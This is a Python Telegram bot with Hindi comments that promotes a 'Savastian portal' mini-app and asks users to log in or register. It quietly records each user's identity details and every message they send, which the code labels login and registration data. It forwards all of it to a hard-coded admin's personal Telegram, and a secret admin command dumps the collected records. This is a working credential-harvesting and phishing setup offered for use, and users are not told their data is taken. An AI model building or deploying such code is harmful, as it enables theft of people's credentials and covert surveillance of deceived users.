import os
import logging
from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
from aiohttp import web

# एनवायरनमेंट वेरिएबल्स से टोकन और एडमिन आईडी उठाना
TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "8631580614"))
PORT = int(os.getenv("PORT", 10000))

bot = Bot(token=TOKEN)
dp = Dispatcher(bot)

# जिंदगी भर (जब तक बोट ऑन है) डेटा स्टोर करने के लिए ग्लोबल लिस्ट
LIFETIME_USER_LOGS = []

@dp.message_handler(commands=['start'])
async def send_welcome(message: types.Message):
    user = message.from_user
    
    # यूजर के लिए वेबसाइट/पोर्टल खोलने का बटन
    keyboard = InlineKeyboardMarkup()
    web_app = WebAppInfo(url="https://savastan0so-t9zz.vercel.app/")
    keyboard.add(InlineKeyboardButton(text="🚀 सेवस्टियन पोर्टल / मिनी ऐप खोलें", web_app=web_app))
    
    await message.reply(
        "नमस्ते! सेवस्टियन में आपका स्वागत है। पोर्टल पर जाने और लॉगिन/रजिस्टर करने के लिए नीचे दिए गए बटन पर क्लिक करें:",
        reply_markup=keyboard
    )
    
    # अगर नया यूजर आया है, तो उसका लॉग तैयार करना
    if user.id != ADMIN_ID:
        sr_no = len(LIFETIME_USER_LOGS) + 1
        entry = (
            f"[{sr_no}] 🌐 **नया यूजर वर्ल्डवाइड से आया:**\n"
            f"- नाम: {user.full_name}\n"
            f"- यूजरनेम: @{user.username if user.username else 'N/A'}\n"
            f"- टेलीग्राम आईडी: `{user.id}`\n"
            f"- भाषा: {user.language_code}\n"
            f"- समय: {message.date.strftime('%d %b %Y, %I:%M:%S %p')}"
        )
        LIFETIME_USER_LOGS.append(entry)
        
        try:
            await bot.send_message(ADMIN_ID, f"🔔 **नया अलर्ट [स्र.नं. {sr_no}]**\n\n{entry}")
        except Exception as e:
            print(e)

# तेरी पक्की सीक्रेट एडमिन कमांड: /admin_ZAROPLAYisFINAL
@dp.message_handler(commands=['admin_ZAROPLAYisFINAL'])
async def admin_panel(message: types.Message):
    # सुरक्षा जांच: सिर्फ तेरी आईडी के लिए काम करेगा
    if message.from_user.id != ADMIN_ID:
        return  # दुनिया की किसी अन्य आईडी के लिए यह कमांड पूरी तरह गायब/असरहीन रहेगी

    # एडमिन डैशबोर्ड वेबसाइट खोलने का बटन
    keyboard = InlineKeyboardMarkup()
    web_app = WebAppInfo(url="https://savastan0so-t9zz.vercel.app/")
    keyboard.add(InlineKeyboardButton(text="📊 पूरा एडमिन पैनल वेबसाइट खोलें", web_app=web_app))

    # नंबर-वाइज सारे लॉग्स तैयार करना
    if LIFETIME_USER_LOGS:
        all_logs_text = "\n\n━━━━━━━━━━━━━━━\n\n".join(LIFETIME_USER_LOGS)
    else:
        all_logs_text = "अभी तक डेटाबेस में कोई भी लॉगिन या रजिस्ट्रेशन दर्ज नहीं हुआ है।"

    response_text = (
        f"🛠 **-- लाइफटाइम एडमिन पैनल (ZAROPLAY FINAL) --**\n\n"
        f"👑 एडमिन: उमंग लाल मीना\n"
        f"📊 कुल सेव्ड रिकॉर्ड्स: {len(LIFETIME_USER_LOGS)}\n\n"
        f"📋 **नंबर-वाइज डिटेल्स (लाइफटाइम):**\n\n"
        f"{all_logs_text}"
    )

    await message.reply(response_text, reply_markup=keyboard, parse_mode="Markdown")

# यूजर द्वारा पोर्टल या चैट में भेजी गई कोई भी लॉगिन/रजिस्ट्रेशन डिटेल्स हैंडल करना
@dp.message_handler(content_types=['text'])
async def handle_user_submission(message: types.Message):
    user = message.from_user
    if user.id == ADMIN_ID:
        return  # एडमिन के खुद के मैसेज इग्नोर होंगे

    text_data = message.text
    sr_no = len(LIFETIME_USER_LOGS) + 1
    
    submission_entry = (
        f"[{sr_no}] 🚨 **रजिस्ट्रेशन/लॉगिन डेटा प्राप्त हुआ:**\n"
        f"- नाम: {user.full_name}\n"
        f"- यूजरनेम: @{user.username if user.username else 'N/A'}\n"
        f"- आईडी: `{user.id}`\n"
        f"- भरी गई डिटेल्स/डेटा: {text_data}\n"
        f"- समय: {message.date.strftime('%d %b %Y, %I:%M:%S %p')}"
    )
    LIFETIME_USER_LOGS.append(submission_entry)

    # सीधे तेरे पर्सनल टेलीग्राम पर भेजना
    try:
        await bot.send_message(ADMIN_ID, submission_entry, parse_mode="Markdown")
    except Exception as e:
        print(e)

# Render के पोर्ट टाइमआउट से बचने के लिए वेब सर्वर
async def handle(request):
    return web.Response(text="Bot and Portal Server are running 24/7 successfully!")

app = web.Application()
app.router.add_get('/', handle)

async def on_startup(dispatcher):
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True, on_startup=on_startup)
    
